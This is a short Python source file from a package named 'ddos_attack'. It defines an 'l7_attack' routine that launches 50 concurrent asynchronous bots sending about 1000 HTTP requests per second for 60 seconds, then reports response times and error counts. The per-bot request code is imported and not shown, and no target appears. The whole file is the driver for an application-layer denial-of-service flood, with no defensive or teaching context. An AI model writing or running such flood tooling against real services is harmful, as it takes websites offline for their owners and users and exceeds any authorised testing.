import time
import asyncio
import aiohttp
from aiolimiter import AsyncLimiter
from ddos_attack.utils import bot, bot_statistic

BOTS_COUNT = 50
RPS = 1000
DURATION = 60


async def l7_attack():
    limiter = AsyncLimiter(RPS, 1)
    stats = {'response_times': [], 'http_codes': [], 'errors_count': 0}

    timeout = aiohttp.ClientTimeout(total=15)
    connector = aiohttp.TCPConnector(limit=0)  # let asyncio handle concurrency
    stop_time = time.time() + DURATION

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = []
        for i in range(BOTS_COUNT):
            tasks.append(asyncio.create_task(bot(f"b{i}", session, limiter, stats, stop_time)))
        await asyncio.gather(*tasks, return_exceptions=True)

    if stats['response_times']:
        bot_statistic(stats)
    else:
        print("No successful requests recorded.")